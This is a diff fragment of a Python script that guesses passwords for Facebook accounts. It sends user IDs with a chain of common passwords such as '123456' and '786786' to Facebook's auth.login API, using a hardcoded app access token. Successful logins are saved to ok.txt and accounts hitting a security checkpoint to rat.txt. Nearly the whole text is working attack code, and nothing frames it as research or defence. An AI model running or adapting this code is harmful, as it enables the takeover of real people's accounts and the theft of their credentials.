-																			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent": vaugent,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&locale=en_UD&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
-																			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=en_US',data=dataa,allow_redirects=False)
-																			if "checkpoint" in po.cookies.get_dict().keys():
-																				print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass9+"\033[0;97m")
-																				cp = open("rat.txt", "a")
-																				cp.write(uid+"|"+pass9+"\n")
-																				cp.close()
-																				cps.append(uid+pass9)
-																			elif "c_user" in ses.cookies.get_dict().keys():
-																				coki=po.cookies.get_dict()
-																				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-																				print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass9+"\033[0;97m")
-																				ok = open("ok.txt", "a")
-																				ok.write(uid+"|"+pass9+"\n")
-																				ok.close()
-																				oks.append(uid+pass9)
+																  			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass9+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
+																			q = json.loads(data)
+																			if "access_token" in q and "EAAA" in q:
+																  			    print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass9+"\033[0;97m")
+																  			    ok = open("ok.txt", "a")
+																  			    ok.write(uid+"|"+pass9+"\n")
+																  			    ok.close()
+																  			    oks.append(uid+pass9)
+																			else:
+																  			        if "www.facebook.com" in q['error_msg']:
+																  			                print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass9+"\033[0;97m")
+																  			                cp = open("rat.txt", "a")
+																  			                cp.write(uid+"|"+pass9+"\n")
+																  			                cp.close()
+																  			                cps.append(uid+pass9)
+																  			        else:		
+																					pass10 = "223344"
+																					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass10+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
+																					q = json.loads(data)
+																					if "access_token" in q and "EAAA" in q:
+																						print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass10+"\033[0;97m")
+																						ok = open("ok.txt", "a")
+																						ok.write(uid+"|"+pass10+"\n")
+																						ok.close()
+																						oks.append(uid+pass10)
+																  			 		else:
+																  			        		if "www.facebook.com" in q['error_msg']:
+																							print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass10+"\033[0;97m")
+																							cp = open("rat.txt", "a")
+																							cp.write(uid+"|"+pass10+"\n")
+																							cp.close()
+																							cps.append(uid+pass10)
+																						else:
+																							pass11 = "556677"
+																							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass11+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
+																							q = json.loads(data)
+																							if "access_token" in q and "EAAA" in q:
+																								print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass11+"\033[0;97m")
+																								ok = open("ok.txt", "a")
+																								ok.write(uid+"|"+pass11+"\n")
+																								ok.close()
+																								oks.append(uid+pass11)
+																							else:
+																								if "www.facebook.com" in q['error_msg']:
+																									print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass11+"\033[0;97m")
+																									cp = open("rat.txt", "a")
+																									cp.write(uid+"|"+pass11+"\n")
+																									cp.close()
+																									cps.append(uid+pass1)
+																								else:
+																									pass12 = "786786"
+																									data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass12+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
+																									q = json.loads(data)
+																									if "access_token" in q and "EAAA" in q:
+																										print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass12+"\033[0;97m")
+																										ok = open("ok.txt", "a")
+																										ok.write(uid+"|"+pass12+"\n")
+																										ok.close()
+																										oks.append(uid+pass12)
+																									else:
+																										if "www.facebook.com" in q['error_msg']:
+																											print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass12+"\033[0;97m")
+																											cp = open("rat.txt", "a")
+																											cp.write(uid+"|"+pass12+"\n")
+																											cp.close()
+																											cps.append(uid+pass12)
+																										else:
+																											pass13 = "123456"
+																											data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass13+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
+																											q = json.loads(data)
+																											if "access_token" in q and "EAAA" in q:
+																												print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass13+"\033[0;97m")
+																												ok = open("ok.txt", "a")
+																												ok.write(uid+"|"+pass13+"\n")
+																												ok.close()
+																												oks.append(uid+pass13)
+																											else:
+																												if "www.facebook.com" in q['error_msg']:
+																													print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass13+"\033[0;97m")
+																													cp = open("rat.txt", "a")
+																													cp.write(uid+"|"+pass13+"\n")
+																													cp.close()
+																													cps.append(uid+pass13)
+																												else:
+																													pass14 = "112233"
+																													data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass14+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
+																													q = json.loads(data)
+																													if "access_token" in q and "EAAA" in q:
+																														print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass14+"\033[0;97m")
+																														ok = open("ok.txt", "a")
+																														ok.write(uid+"|"+pass14+"\n")
+																														ok.close()
+																														oks.append(uid+pass14)
+																													else:
+																														if "www.facebook.com" in q['error_msg']:
+																															print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass14+"\033[0;97m")
+																															cp = open("rat.txt", "a")
+																															cp.write(uid+"|"+pass14+"\n")
+																															cp.close()
+																															cps.append(uid+pass14)
+																														else:
+																															pass15 = "123356789"
+																															data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass15+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
+																															q = json.loads(data)
+																															if "access_token" in q and "EAAA" in q:
+																																print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass15+"\033[0;97m")
+																																ok = open("ok.txt", "a")
+																																ok.write(uid+"|"+pass15+"\n")
+																																ok.close()
+																																oks.append(uid+pass15)
+																															else:
+																																if "www.facebook.com" in q['error_msg']:
+																																	print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass15+"\033[0;97m")
+																																	cp = open("rat.txt", "a")
+																																	cp.write(uid+"|"+pass15+"\n")
+																																	cp.close()											
+																																	cps.append(uid+pass15)
 																																
 		
 												
